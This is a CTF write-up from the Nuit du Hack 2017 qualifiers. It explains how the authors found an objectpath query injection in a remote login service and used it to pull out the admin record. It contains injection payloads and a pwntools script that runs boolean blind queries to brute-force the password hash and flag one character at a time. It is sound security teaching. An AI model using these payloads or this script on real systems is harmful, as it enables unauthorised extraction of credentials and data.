---
layout: post
title: "Nuit du Hack CTF Quals 2017: Entrop3r (Exploit 350)"
author: f0rki, roman
categories: writeup
tags: [cat/pwn, vuln/injection]
---

* **Category:** Exploit
* **Points:** 350
* **Solves:** 29
* **Description:**

> SecureAuth is BACK ! A hackerproof version, protected from ALL attacks, with
> a powerful password encryption and brand new features ! 
>
> Url tcp://entrop3r.quals.nuitduhack.com:31337/


## Write-up

OK so a exploit challenge, with no binary... hmm let's see. 

```
███████╗███████╗ ██████╗██╗   ██╗██████╗ ███████╗ █████╗ ██╗   ██╗████████╗██╗  ██╗
██╔════╝██╔════╝██╔════╝██║   ██║██╔══██╗██╔════╝██╔══██╗██║   ██║╚══██╔══╝██║  ██║
███████╗█████╗  ██║     ██║   ██║██████╔╝█████╗  ███████║██║   ██║   ██║   ███████║
╚════██║██╔══╝  ██║     ██║   ██║██╔══██╗██╔══╝  ██╔══██║██║   ██║   ██║   ██╔══██║
███████║███████╗╚██████╗╚██████╔╝██║  ██║███████╗██║  ██║╚██████╔╝   ██║   ██║  ██║
╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝
                                                                        Version 2.0

Available commands
~~~~~~~~~~~~~~~~~~

# auth
# register
# debug
# exit

~ » 
```

Ah we're greeted with some nice utf-8 art and a couple of commands.

```
~ » debug
[DEBUG : ON]
~ » register
Registration Form
~~~~~~~~~~~~~~~~~

Username # user
Username user : OK !
Password # password
Checking password strength...[DEBUG] {'crack_time_display': 'instant', 'crack_time': 0.0, 'score': 0, 'entropy': 0.0, 'password': 'password', 'calc_time': 0.0009300708770751953, 'match_sequence': [{'l33t_entropy': 0, 'dictionary_name': u'passwords', 'matched_word': 'password', 'base_entropy': 0.0, 'i': 0, 'pattern': 'dictionary', 'j': 7, 'rank': 1, 'token': 'password', 'entropy': 0.0, 'uppercase_entropy': 0}]}
Password strength OK : (Entropy : 0.0 - Score : 0)
Could not register. Weak password.
```

Aha, the debug message looks suspiciously like a python dictionary. So we
probably have a python service here.
The description says "SecureAuth is back", so we searched for SecureAuth and
ndhquals and we found a couple of writeups of a past ndh challenge, which was a
redis injection vulnerability. Maybe this is something similar? From the
SecureAuth writeups we got the idea to use the `admin` username:

```
~ » register
Registration Form
~~~~~~~~~~~~~~~~~

Username # admin
ERROR : User admin already exists !
~ » register
Registration Form
~~~~~~~~~~~~~~~~~

Username # admin'
objectpath exception : SyntaxError: Unknown operator '(operator)', '''
```

What the hell is objectpath? A quick search revealed a library that can be used
to query nested JSON/dictionary data structures:
http://objectpath.org/reference.html

So we have some kind of injection vulnerability. We played around a little with
the injection:

```
Username # admin'], [
ERROR : User admin'], [ already exists !
```

So the query code probably looks something like this:

```python
query = "$.users[@.username is '" + username + "']"
```

Ah so we can probably do some kind of boolean based injection:

```
Username # admin' and '1' is '2
Username admin' and '1' is '2 : OK !
```

```
Username # admin' and '1' is '1
ERROR : User admin' and '1' is '1 already exists !
```

Very good. Now we can use this to exfiltrate data. I threw together a little
script to perform boolean queries using the injection vulnerability. Note
that if we get back that the user doesn't exist, we need to input a password
and wait for the password check to complete. This takes ages, so in this case
we open a new connection, which is much faster

```python
def new_con():
    with context.local(log_level='warning'):
        rem = remote("entrop3r.quals.nuitduhack.com", 31337)
        rem.recvuntil("~")
        rem.sendline("debug")
        rem.recvuntil("~")
    return rem


class InjectionFailedException(Exception):
    pass


def inject(q, sendpw=True):
    global rem
    if not rem:
        rem = new_con()
    try:
        rem.sendline("register")
        rem.recvuntil("Username #")
        rem.sendline(q)
        line = rem.recvline().strip()
        log.debug("received line\n{!r}".format(line))

        if exc_msg in line:
            raise InjectionFailedException(line)

        wat = rem.recv()
        if "Password" in wat:
            if sendpw:
                rem.sendline("")
            else:
                with context.local(log_level='warning'):
                    rem.close()
                    rem = new_con()
                return line

        log.debug("wat is\n" + hexdump(wat))
        if "~" not in wat:
            wat += rem.recvuntil("~")
        log.debug("received the rest:\n" + wat)

        return line
    except EOFError:
        log.warning("got EOF - restarting connection")
        with context.local(log_level='warning'):
            rem.close()
        rem = None
        return inject(q, sendpw)


def bool_query(q):
    aq = "admin' and {} and '1' is '1".format(q)
    try:
        line = inject(aq, False)
    except InjectionFailedException as e:
        log.warning("query failed: {}".format(e))
        return None
    if "already exists" in line:
        return True
    else:
        return False
```

So let's try to find out some info about the data:

```
In [4]: bool_query("$.users")
Out[4]: True

In [5]: bool_query("len($.users) is 1")
Out[5]: True

In [8]: bool_query("len($.users[0]) is 4")
Out[8]: True

In [9]: bool_query("$.users[0].password")
Out[9]: True

In [10]: bool_query("$.users[0].wtf")
Out[10]: False

In [11]: bool_query("$.users[0].entropy")
Out[11]: True

In [12]: bool_query("$.users[0].score")
Out[12]: False

In [13]: bool_query("$.users[0].username")
Out[13]: False

In [14]: bool_query("$.users[0].user")
Out[14]: False
```

So now we now that the data structure looks something like this:

```json
{
    "users" : [
        {
            "password": "???",
            "entropy": ???,
            "???": ???,
            "???": "admin"
        }
    ]
}
```

So we started by creating a function that exfiltrates the password. We first
performed queries like `'a' in $.users[0].password` to find all the chars in
the password. Then we used queries like `$.user[0].password[0] is 'a'` to
get the value of the password:


```python
char_tries = string.printable[:-6].replace("'", "").replace("\\", "")


def find_str(base_query):
    """
    exfiltrate a string using boolean queries
    """
    # first find the chars that are contained in the string to speed up
    # bruteforcing
    char_tries_real = []
    pr = log.progress("char_tries[i]")
    for i, c in enumerate(char_tries):
        pr.status("{!r} ({!r})".format(c, "".join(char_tries_real)))
        r = bool_query("'{}' in {}".format(c, base_query))
        if r is None:
            log.error("dayum char tries")
        if r:
            char_tries_real.append(c)

    log.info("bf alphabet: {!r}".format("".join(char_tries_real)))

    pw_len = 100

    # for every index, try all possible chars at that index
    # abort when no candidate is found (probably end of the string)
    password = []
    pr0 = log.progress("{}[:i] is: ".format(base_query))
    for i in range(pw_len):
        pr0.status("".join(password))
        pr = log.progress("password[{}] ==".format(i))
        for j, c in enumerate(char_tries_real):
            pr.status("{!r} ({}/{})".format(c, j, len(char_tries_real)))
            r = bool_query("{}[{}] is '{}'".format(base_query, i, c))
            if r is None:
                log.error("dayum")
            if r:
                pr.success(repr(c))
                password.append(c)
                break
        else:
            log.warning("couldn't find candidate for {}".format(i))
            break
    log.info("string is: {!r} ({})".format("".join(password), len(password)))

    return "".join(password)


find_str("$.users[0].password")
```

So what we got was

```
$CONFIGSALT$9c2137e18b28698e00f97428aca597a75c4526e90755fadb2704dc3c5ce6627b
```

Well damn. What are we supposed to do with this? Maybe the other fields are the
thing. I just guessed a fieldname:

```
In [16]: bool_query("$.users[0].flag")
Out[16]: True
```

Oh. 

```python
find_str("$.users[0].flag")
```

```
NDH{+!$!I_CREATED_A_NEW_INJECTION_ATTACK!$!+}
```

While trying to find the second flag we then also found a way to get the field
names with queries like `array($.users[0])[i]`, i.e.

```python
find_str("array($.users[0])[0]") == "login"
find_str("array($.users[0])[1]") == "password"
find_str("array($.users[0])[2]") == "entropy"
find_str("array($.users[0])[3]") == "flag"
```

The full data structure is:

```json
{
  "users" : [
    {
      "login": "admin",
      "password": "$CONFIGSALT$9c2137e18b28698e00f97428aca597a75c4526e90755fadb2704dc3c5ce6627b",
      "entropy": 51.558,
      "flag": "NDH{+!$!I_CREATED_A_NEW_INJECTION_ATTACK!$!+}"
    }
  ]
}
```

Unfortunately we didn't manage to get the second flag for this challenge :(
